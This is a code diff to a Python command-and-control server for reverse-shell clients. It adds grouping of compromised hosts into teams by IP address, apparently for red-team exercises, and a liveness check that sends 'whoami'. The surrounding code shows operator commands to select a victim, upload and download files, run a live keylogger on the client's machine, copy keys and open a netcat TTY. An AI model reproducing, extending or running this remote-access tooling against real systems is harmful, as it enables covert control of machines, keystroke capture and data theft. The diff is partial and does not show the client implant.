@@ -19,6 +19,7 @@ from cmd import Cmd
 #TODO Store commands in config file
 #TODO Exit does not end connection, but resets the client to keep trying to connect.
 
+#TODO The sever knows how many teams and what boxes are on each team. The user can use ls -all to see all teams that are unconnected and connected.
 
 
 # class MainShell(cmd):
@@ -36,12 +37,16 @@ class Team():
     def listClients(self):
         print("> Team " + self.identity + ":")
         for client in self.clients:
-            print("    >> " + client.getNick())
+            try: #Try to see if the client is still alive, if they are, print them. If not, skip them.
+                client.getSocket().send("whoami".encode())
+                client.getSocket().recv(BUFFER_SIZE)
+                print("    >> " + client.getNick())
+            except:
+                pass
 
 class Service():
     #TODO Each service has stored commands to break it
     pass
-
 
 #Class to store IP, port, connection, and tags for the 
 class Connection:
@@ -56,6 +61,7 @@ class Connection:
         self.team = 'N/A'
         self.service = 'N/A'
         self.tags = []
+        self.assign_client()
     
     def addTags(self, tag):
         self.tags.append(tag)
@@ -74,6 +80,18 @@ class Connection:
 
     def setTeam(self, team):
         self.team = team
+
+    def assign_client(self):
+        team_index = IP_FORMAT.split(".").index("TEAM") #Find the team index
+        host_index = IP_FORMAT.split(".").index("HOST") #Find the host index
+        ip_splitted = self.IP.split(".") #Split the IP on the .
+        team = ip_splitted[team_index]
+        host = ip_splitted[host_index]
+        if team not in TEAMS:
+            # print("Team \"" + team + "\" does not exist! Creating..." )
+            addTeam(str(team))
+        assignTeam(self,TEAMS[team])
+        
     
 #Take the clients message of if the reverse shell was started or not
 SERVER_ADDR = "127.0.0.1"
@@ -82,8 +100,9 @@ BUFFER_SIZE = 1024 * 128 #128KB max size
 CURRENT_CONNECTIONS = []
 CURRENT_CONNECTIONS_CLASS = []
 CURRENT_ADDRESSES = []
-TEAMS = []
+TEAMS = {}
 UNASSIGNED_CONNECTIONS = []
+IP_FORMAT = "X.X.TEAM.HOST"
 
 #If the user starts the server and wants to specify the ip to host on
 if len(sys.argv) == 2:
@@ -208,7 +227,7 @@ def handleCommand():
             elif cmd.lower() == "help":
                 print("\nHelp Menu: \n\tUse 'list' to list active connections. \
                     \n\tUse 'select' to choose a client from the list. \
-                    \n\t Use 'lsteam' to list each team's connections. \
+                    \n\tUse 'lsteam' to list each team's connections. \
                     \n\tUse 'assign' to assign a client to a team. \
                     \n\tUse 'mkteam' to create a team. \
                     \n\tUse 'help' to show this menu. \
@@ -226,7 +245,6 @@ def handleCommand():
         except Exception as e:
             print("Invalid use of command! \n" + str(e))
             
-
 #List Current Connections
 def list_clients():
     results = ""
@@ -257,18 +275,17 @@ def list_clients():
         print("No active connections!")
 
 def addTeam(identity):
-    TEAMS.append(Team(str(identity)))
+    TEAMS[identity] = Team(str(identity))
     print("Team \"" + str(identity) + "\" created successfully.")
 
 def assignTeam(client, team):
-    team = TEAMS.index(team)
-    TEAMS[team].assign(client)
+    team.assign(client)
     UNASSIGNED_CONNECTIONS.remove(client)
 
 def listTeams():
     print("Team's Connections:")
     for team in TEAMS:
-        team.listClients()
+        TEAMS[team].listClients()
     if(UNASSIGNED_CONNECTIONS):
         print("\nUnassigned Clients: ")
         for client in UNASSIGNED_CONNECTIONS:
@@ -331,7 +348,7 @@ def client_console(cmd):
                 upload_file(newCMD,CURRENT_CONNECTIONS[target])
             elif "keylogger" in newCMD:
                 start_keylog(newCMD, CURRENT_CONNECTIONS[target])
-            elif "TTY" in newCMD:
+            elif "tty" in newCMD:
                 startTTY(CURRENT_ADDRESSES[target][0])
             elif "key" in newCMD.lower():
                 copyKey(CURRENT_CONNECTIONS[target])
@@ -353,7 +370,7 @@ def client_console(cmd):
                     \n\tUse 'ul' to upload a file.\
                     \n\tUse 'keylogger' to start a live keylog of the clients machine.\
                     \n\tUse 'ncport' to get the port the shell is listening on.\
-                    \n\tUse 'TTY' to start a new TTY in netcat.\n")
+                    \n\tUse 'tty' to start a new TTY in netcat.\n")
             elif "exit" in newCMD:
                 break
             else:
@@ -406,7 +423,6 @@ def start_keylog(cmd,conn):
         conn.send("KEY_L0GGER-END".encode())
         print("Keylogger ending... Returning to client menu.")
         
-
 def download_file(cmd,conn):
     try:
         conn.send(("DOWNLOAD_FILE_FROM_S3RVER").encode()) #Tell client we want to download
@@ -483,4 +499,3 @@ def shutdown_clients():
 if __name__ == "__main__":
     print("[SERVER] Server is starting...") 
     create_threads()
-
